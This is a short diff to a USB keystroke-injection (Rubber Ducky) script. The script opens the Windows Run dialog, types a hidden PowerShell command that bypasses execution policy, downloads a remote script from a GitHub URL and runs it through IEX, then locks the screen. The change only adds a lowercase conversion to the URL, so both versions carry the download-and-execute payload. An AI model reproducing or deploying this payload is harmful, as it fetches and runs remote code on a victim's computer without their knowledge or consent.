@@ -1,6 +1,6 @@
 GUI r
 DELAY 200
-STRING powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command IEX "(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/phikshun/duckyfiles/master/wallpaper.ps1')"
+STRING powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command IEX "(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/phikshun/duckyfiles/master/wallpaper.ps1'.ToLower())"
 ENTER
 DELAY 200
 GUI l
